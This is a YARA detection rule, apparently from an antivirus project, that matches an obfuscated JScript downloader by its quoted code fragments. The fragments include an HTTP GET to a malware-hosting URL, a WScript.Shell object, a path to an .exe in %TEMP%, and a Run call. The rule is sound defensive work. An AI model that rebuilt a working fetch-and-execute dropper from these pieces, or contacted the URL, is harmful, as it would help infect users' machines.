rule sig_20160330_a804c6d108ecdc3a10262fe3bbefa91b {
  meta:
    description = "datamaliciousorder - file 20160330_a804c6d108ecdc3a10262fe3bbefa91b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b54b242a43adfe73591138c7f5bbfa6312d681ab4542893a457f95ba9cf94b79"

  strings:
    $s1  = "_Q[_V0](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _AF(_G, _AU){_AQ = _AQ * 1; return _G - _AU;};" fullword ascii
    $s3  = "var _I1 = function _N() {return WScript[_H0](\"WScript\"+\".Shell\");}(), _RH = 11;" fullword ascii
    $s4  = "if (_Q[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _J() {return _I1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HnQga3d3zrd0V.ex\" + \"e\";};" fullword ascii
    $s6  = "function _D(){return _A + \"\";};" fullword ascii
    $s7  = "function _C(_N0){_I1[\"Run\"](_N0, _AQ, _AQ);};" fullword ascii
    $s8  = "function _XI() {return ((_K0 == true) && (_K0 == _NZ)) ? 1 : _AQ;};" fullword ascii
    $s9  = "var _L = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_K){" fullword ascii
    $s11 = "function _V(){return 22;};" fullword ascii
    $s12 = "return _AF(_BZ, _P);" fullword ascii
    $s13 = "function _H(_JV) {var _PL = (1, 2, 3, 4, 5, _JV); return _PL;};" fullword ascii
    $s14 = "function _QJ(){return _H0;};" fullword ascii
    $s15 = "function _SQ()" fullword ascii
    $s16 = "var _K0 = false;" fullword ascii
    $s17 = "_K0 = true; " fullword ascii
    $s18 = "var _QW = false;" fullword ascii
    $s19 = "_NZ = true; " fullword ascii
    $s20 = "var _NZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}